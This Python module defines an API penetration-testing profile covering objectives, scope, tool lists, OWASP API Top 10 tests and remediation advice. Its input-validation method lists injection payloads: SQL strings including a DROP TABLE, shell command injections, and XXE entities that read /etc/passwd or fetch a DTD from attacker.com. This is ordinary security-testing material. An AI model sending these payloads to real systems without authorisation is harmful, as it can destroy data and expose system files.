"""
API VAPT Module - API security testing
Specialized module for API vulnerability assessment and penetration testing
"""

from colorama import Fore, Style

class APIVAPT:
    def __init__(self):
        self.vapt_type = "api"
        
    def get_default_objectives(self):
        """Get default objectives for API VAPT"""
        return [
            "Identify API endpoints and documentation",
            "Test API authentication and authorization mechanisms",
            "Assess API input validation and data handling",
            "Evaluate API rate limiting and abuse prevention",
            "Test for OWASP API Security Top 10 vulnerabilities",
            "Assess API versioning and backward compatibility security",
            "Evaluate API error handling and information disclosure",
            "Test API business logic and workflow security",
            "Assess API data exposure and privacy controls",
            "Evaluate API logging and monitoring capabilities"
        ]
        
    def get_default_scope(self, target):
        """Get default scope for API VAPT"""
        return {
            'target_api': target,
            'inclusions': [
                'All API endpoints and methods',
                'API authentication systems',
                'API data validation mechanisms',
                'API rate limiting controls',
                'API documentation and schemas',
                'API versioning implementations'
            ],
            'exclusions': [
                'Production data modification (unless authorized)',
                'Third-party API integrations',
                'Legacy API versions (unless specified)',
                'Administrative API functions (without authorization)'
            ],
            'constraints': [
                'Respect API rate limits',
                'No denial of service testing',
                'Read-only operations preferred',
                'Minimal impact on API performance'
            ]
        }
        
    def get_default_methodology(self):
        """Get default methodology for API VAPT"""
        return "OWASP API Security Testing Guide"
        
    def get_default_tools(self):
        """Get default tools for API VAPT"""
        return [
            'postman', 'burp_suite', 'owasp_zap', 'insomnia', 'curl',
            'restfulapi_scanner', 'api_fuzzer', 'jwt_tool', 'arjun'
        ]
        
    def get_available_tools(self):
        """Get available tools with descriptions"""
        return {
            'postman': 'API development and testing platform',
            'burp_suite': 'Web application and API security testing suite',
            'owasp_zap': 'Web application and API security scanner',
            'insomnia': 'API client and testing tool',
            'curl': 'Command-line HTTP client',
            'restfulapi_scanner': 'RESTful API vulnerability scanner',
            'api_fuzzer': 'API endpoint fuzzing tool',
            'jwt_tool': 'JSON Web Token security testing tool',
            'arjun': 'HTTP parameter discovery tool',
            'ffuf': 'Fast web fuzzer for APIs',
            'gobuster': 'Directory/file/DNS enumeration tool',
            'nikto': 'Web server and API scanner',
            'sqlmap': 'SQL injection testing tool',
            'graphql_voyager': 'GraphQL schema exploration tool'
        }
        
    def get_vulnerability_tools(self):
        """Get vulnerability assessment tools specific to API testing"""
        return {
            'owasp_zap': 'Comprehensive API vulnerability scanner',
            'burp_suite': 'Professional API security testing suite',
            'nuclei': 'Fast API vulnerability scanner',
            'api_security_scanner': 'Specialized API security testing tool',
            'jwt_tool': 'JWT vulnerability assessment',
            'graphql_cop': 'GraphQL security testing tool',
            'custom_checks': 'Custom API vulnerability checks',
            'api_fuzzer': 'API parameter and endpoint fuzzing',
            'rest_api_fuzzer': 'REST API specific fuzzing tool'
        }
        
    def get_available_exploits(self):
        """Get available exploits for API testing"""
        return [
            {
                'name': 'Broken Object Level Authorization',
                'description': 'Test for broken object level authorization (BOLA)',
                'type': 'bola_test',
                'targets': ['object_references', 'user_data'],
                'risk_level': 'high',
                'safe_for_automation': True
            },
            {
                'name': 'Broken User Authentication',
                'description': 'Test for authentication bypass and weaknesses',
                'type': 'auth_bypass_test',
                'targets': ['authentication'],
                'risk_level': 'critical',
                'safe_for_automation': False
            },
            {
                'name': 'Excessive Data Exposure',
                'description': 'Test for excessive data exposure in API responses',
                'type': 'data_exposure_test',
                'targets': ['api_responses'],
                'risk_level': 'medium',
                'safe_for_automation': True
            },
            {
                'name': 'Lack of Resources and Rate Limiting',
                'description': 'Test for lack of rate limiting and resource controls',
                'type': 'rate_limit_test',
                'targets': ['rate_limiting'],
                'risk_level': 'medium',
                'safe_for_automation': True
            },
            {
                'name': 'Broken Function Level Authorization',
                'description': 'Test for broken function level authorization',
                'type': 'function_auth_test',
                'targets': ['function_authorization'],
                'risk_level': 'high',
                'safe_for_automation': True
            },
            {
                'name': 'Mass Assignment',
                'description': 'Test for mass assignment vulnerabilities',
                'type': 'mass_assignment_test',
                'targets': ['parameter_binding'],
                'risk_level': 'medium',
                'safe_for_automation': True
            },
            {
                'name': 'Security Misconfiguration',
                'description': 'Test for API security misconfigurations',
                'type': 'misconfiguration_test',
                'targets': ['configuration'],
                'risk_level': 'medium',
                'safe_for_automation': True
            },
            {
                'name': 'Injection Vulnerabilities',
                'description': 'Test for injection vulnerabilities in API parameters',
                'type': 'injection_test',
                'targets': ['input_parameters'],
                'risk_level': 'high',
                'safe_for_automation': False
            },
            {
                'name': 'Improper Assets Management',
                'description': 'Test for improper API assets management',
                'type': 'asset_management_test',
                'targets': ['api_inventory'],
                'risk_level': 'low',
                'safe_for_automation': True
            },
            {
                'name': 'Insufficient Logging and Monitoring',
                'description': 'Test for insufficient logging and monitoring',
                'type': 'logging_test',
                'targets': ['logging_monitoring'],
                'risk_level': 'low',
                'safe_for_automation': True
            }
        ]
        
    def get_reconnaissance_methods(self):
        """Get reconnaissance methods specific to API testing"""
        return {
            'passive': [
                'API documentation discovery',
                'Search engine reconnaissance for API endpoints',
                'GitHub and code repository analysis for API keys',
                'Certificate transparency analysis for API domains',
                'Social media and job posting analysis for API technologies',
                'Third-party API aggregator searches',
                'DNS enumeration for API subdomains',
                'SSL/TLS certificate analysis for API services'
            ],
            'active': [
                'API endpoint enumeration and discovery',
                'API versioning and documentation probing',
                'API authentication mechanism identification',
                'API parameter discovery and fuzzing',
                'API schema and structure analysis',
                'API rate limiting and throttling testing',
                'API error message analysis',
                'API HTTP method enumeration',
                'GraphQL schema introspection',
                'API gateway and proxy detection'
            ]
        }
        
    def get_vulnerability_categories(self):
        """Get vulnerability categories for API testing"""
        return [
            'Broken Object Level Authorization (BOLA)',
            'Broken User Authentication',
            'Excessive Data Exposure',
            'Lack of Resources and Rate Limiting',
            'Broken Function Level Authorization',
            'Mass Assignment',
            'Security Misconfiguration',
            'Injection Vulnerabilities',
            'Improper Assets Management',
            'Insufficient Logging and Monitoring',
            'API Versioning Issues',
            'Business Logic Flaws',
            'Input Validation Failures',
            'Information Disclosure'
        ]
        
    def get_testing_phases(self):
        """Get specific testing phases for API VAPT"""
        return [
            {
                'phase': 'API Discovery and Enumeration',
                'description': 'Discover and enumerate API endpoints and functionality',
                'tools': ['gobuster', 'ffuf', 'arjun', 'custom_scripts'],
                'duration': '2-3 hours'
            },
            {
                'phase': 'API Documentation Analysis',
                'description': 'Analyze API documentation and schema',
                'tools': ['postman', 'swagger_analyzer', 'manual_analysis'],
                'duration': '1-2 hours'
            },
            {
                'phase': 'Authentication and Authorization Testing',
                'description': 'Test API authentication and authorization mechanisms',
                'tools': ['burp_suite', 'jwt_tool', 'custom_scripts'],
                'duration': '3-4 hours'
            },
            {
                'phase': 'Input Validation Testing',
                'description': 'Test API input validation and injection vulnerabilities',
                'tools': ['burp_suite', 'sqlmap', 'api_fuzzer'],
                'duration': '4-6 hours'
            },
            {
                'phase': 'Business Logic Testing',
                'description': 'Test API business logic and workflow security',
                'tools': ['postman', 'burp_suite', 'manual_testing'],
                'duration': '3-5 hours'
            },
            {
                'phase': 'Rate Limiting and DoS Testing',
                'description': 'Test API rate limiting and denial of service protection',
                'tools': ['custom_scripts', 'api_rate_tester'],
                'duration': '1-2 hours'
            }
        ]
        
    def get_owasp_api_top_10(self):
        """Get OWASP API Security Top 10 with testing approach"""
        return {
            'API1_Broken_Object_Level_Authorization': {
                'description': 'APIs tend to expose endpoints that handle object identifiers',
                'tests': ['Object ID manipulation', 'Unauthorized data access', 'IDOR testing'],
                'tools': ['burp_suite', 'custom_scripts', 'postman']
            },
            'API2_Broken_User_Authentication': {
                'description': 'Authentication mechanisms are often implemented incorrectly',
                'tests': ['Weak authentication', 'JWT vulnerabilities', 'Session management'],
                'tools': ['jwt_tool', 'burp_suite', 'custom_auth_tests']
            },
            'API3_Excessive_Data_Exposure': {
                'description': 'APIs may expose more data than necessary',
                'tests': ['Response analysis', 'Data filtering bypass', 'Schema validation'],
                'tools': ['burp_suite', 'response_analyzer', 'custom_scripts']
            },
            'API4_Lack_of_Resources_Rate_Limiting': {
                'description': 'APIs often lack proper rate limiting',
                'tests': ['Rate limit bypass', 'DoS testing', 'Resource exhaustion'],
                'tools': ['rate_limit_tester', 'custom_scripts', 'load_testing_tools']
            },
            'API5_Broken_Function_Level_Authorization': {
                'description': 'Authorization flaws at the function level',
                'tests': ['Privilege escalation', 'Function access control', 'Role-based testing'],
                'tools': ['burp_suite', 'authorization_tester', 'custom_scripts']
            },
            'API6_Mass_Assignment': {
                'description': 'Mass assignment of user-controlled properties',
                'tests': ['Parameter pollution', 'Hidden parameter discovery', 'Data binding bypass'],
                'tools': ['param_miner', 'burp_suite', 'mass_assignment_tester']
            },
            'API7_Security_Misconfiguration': {
                'description': 'Security misconfigurations in API stack',
                'tests': ['Configuration review', 'Default settings', 'Error handling'],
                'tools': ['nuclei', 'configuration_scanner', 'manual_review']
            },
            'API8_Injection': {
                'description': 'Injection flaws in API parameters',
                'tests': ['SQL injection', 'NoSQL injection', 'Command injection', 'XXE'],
                'tools': ['sqlmap', 'nosql_injection_tester', 'burp_suite']
            },
            'API9_Improper_Assets_Management': {
                'description': 'Improper API assets management',
                'tests': ['API inventory', 'Version management', 'Deprecated endpoint testing'],
                'tools': ['api_inventory_tools', 'version_scanner', 'endpoint_discovery']
            },
            'API10_Insufficient_Logging_Monitoring': {
                'description': 'Insufficient logging and monitoring',
                'tests': ['Log analysis', 'Monitoring coverage', 'Incident detection'],
                'tools': ['log_analyzer', 'monitoring_tester', 'manual_review']
            }
        }
        
    def get_api_types_and_testing(self):
        """Get different API types and their specific testing approaches"""
        return {
            'REST_API': {
                'characteristics': ['Resource-based URLs', 'HTTP methods', 'Stateless'],
                'testing_focus': ['HTTP method testing', 'Resource enumeration', 'Status code analysis'],
                'tools': ['burp_suite', 'postman', 'rest_api_scanner']
            },
            'GraphQL_API': {
                'characteristics': ['Single endpoint', 'Query language', 'Schema-based'],
                'testing_focus': ['Introspection queries', 'Query complexity', 'Authorization bypass'],
                'tools': ['graphql_voyager', 'graphql_cop', 'burp_suite']
            },
            'SOAP_API': {
                'characteristics': ['XML-based', 'WSDL definitions', 'Protocol independent'],
                'testing_focus': ['WSDL analysis', 'XML injection', 'SOAP fault exploitation'],
                'tools': ['soapui', 'burp_suite', 'xml_security_tools']
            },
            'gRPC_API': {
                'characteristics': ['Protocol buffers', 'HTTP/2', 'Strongly typed'],
                'testing_focus': ['Protobuf analysis', 'Service enumeration', 'Authentication testing'],
                'tools': ['grpc_tools', 'burp_suite', 'custom_grpc_clients']
            }
        }
        
    def get_authentication_testing_methods(self):
        """Get API authentication testing methods"""
        return {
            'JWT_Testing': [
                'JWT algorithm confusion',
                'JWT secret brute forcing',
                'JWT claim manipulation',
                'JWT signature bypass'
            ],
            'OAuth_Testing': [
                'Authorization code flow testing',
                'Implicit flow vulnerabilities',
                'Scope manipulation',
                'Redirect URI validation'
            ],
            'API_Key_Testing': [
                'API key enumeration',
                'API key privilege testing',
                'API key rotation testing',
                'API key exposure analysis'
            ],
            'Basic_Auth_Testing': [
                'Credential brute forcing',
                'Weak password policies',
                'Credential transmission security',
                'Session management'
            ]
        }
        
    def get_input_validation_vectors(self):
        """Get API input validation testing vectors"""
        return {
            'SQL_Injection': [
                "1' OR '1'='1",
                "'; DROP TABLE users--",
                "1 UNION SELECT * FROM information_schema.tables",
                "1' AND (SELECT COUNT(*) FROM users) > 0--"
            ],
            'NoSQL_Injection': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.password.match(/.*/)"}',
                '{"$regex": ".*"}'
            ],
            'Command_Injection': [
                '; ls -la',
                '| whoami',
                '& ipconfig',
                '`id`'
            ],
            'XXE_Injection': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>'
            ],
            'JSON_Injection': [
                '{"test": "value", "admin": true}',
                '{"user": {"role": "admin"}}',
                '{"$eval": "1+1"}'
            ]
        }
        
    def get_business_logic_testing_areas(self):
        """Get business logic testing areas for APIs"""
        return [
            'Rate limiting bypass techniques',
            'Payment logic manipulation',
            'User privilege escalation',
            'Workflow circumvention',
            'Data validation bypass',
            'Time-based race conditions',
            'State manipulation attacks',
            'Resource exhaustion attacks',
            'Business rule violation testing',
            'Transaction integrity testing'
        ]
        
    def get_common_api_parameters(self):
        """Get common API parameters to test"""
        return {
            'Common_Parameters': [
                'id', 'user_id', 'api_key', 'token', 'session',
                'limit', 'offset', 'page', 'size', 'format'
            ],
            'Hidden_Parameters': [
                'debug', 'admin', 'test', 'internal', 'dev',
                'verbose', 'trace', 'callback', 'jsonp'
            ],
            'Security_Parameters': [
                'auth', 'authorization', 'role', 'permission',
                'scope', 'access_token', 'refresh_token'
            ]
        }
        
    def get_api_security_headers(self):
        """Get API security headers to test"""
        return {
            'Authentication_Headers': [
                'Authorization',
                'X-API-Key',
                'X-Auth-Token',
                'X-Access-Token'
            ],
            'Security_Headers': [
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Strict-Transport-Security'
            ],
            'API_Specific_Headers': [
                'X-Rate-Limit-Limit',
                'X-Rate-Limit-Remaining',
                'X-Rate-Limit-Reset',
                'X-API-Version'
            ]
        }
        
    def get_risk_assessment_criteria(self):
        """Get risk assessment criteria for API vulnerabilities"""
        return {
            'Critical': [
                'Authentication bypass vulnerabilities',
                'Privilege escalation to admin level',
                'SQL injection with database access',
                'Remote code execution'
            ],
            'High': [
                'Broken object level authorization',
                'Mass assignment vulnerabilities',
                'Sensitive data exposure',
                'Function level authorization bypass'
            ],
            'Medium': [
                'Excessive data exposure',
                'Rate limiting bypass',
                'Information disclosure',
                'Business logic flaws'
            ],
            'Low': [
                'Verbose error messages',
                'Version disclosure',
                'Minor configuration issues',
                'Insufficient logging'
            ]
        }
        
    def validate_target(self, target):
        """Validate API target URL"""
        import re
        
        # API URL pattern validation
        api_patterns = [
            r'^https?://.*\..*/(api|v\d+|rest|graphql)',  # API endpoints
            r'^https?://api\..*',  # API subdomains
            r'^https?://.*\.(json|xml)$',  # API response formats
            r'^https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}.*'  # General URL
        ]
        
        return any(re.match(pattern, target, re.IGNORECASE) for pattern in api_patterns)
        
    def get_remediation_guidelines(self):
        """Get remediation guidelines for API security"""
        return {
            'Authentication_Authorization': [
                'Implement proper authentication mechanisms',
                'Use strong authorization controls',
                'Implement role-based access control',
                'Regular access reviews and audits'
            ],
            'Input_Validation': [
                'Implement comprehensive input validation',
                'Use parameterized queries',
                'Sanitize and validate all inputs',
                'Implement output encoding'
            ],
            'Rate_Limiting': [
                'Implement proper rate limiting',
                'Use distributed rate limiting',
                'Monitor for abuse patterns',
                'Implement circuit breakers'
            ],
            'Data_Protection': [
                'Minimize data exposure in responses',
                'Implement field-level security',
                'Use data encryption',
                'Regular data classification reviews'
            ],
            'Monitoring_Logging': [
                'Implement comprehensive API logging',
                'Monitor for security events',
                'Set up alerting for anomalies',
                'Regular security assessments'
            ]
        }
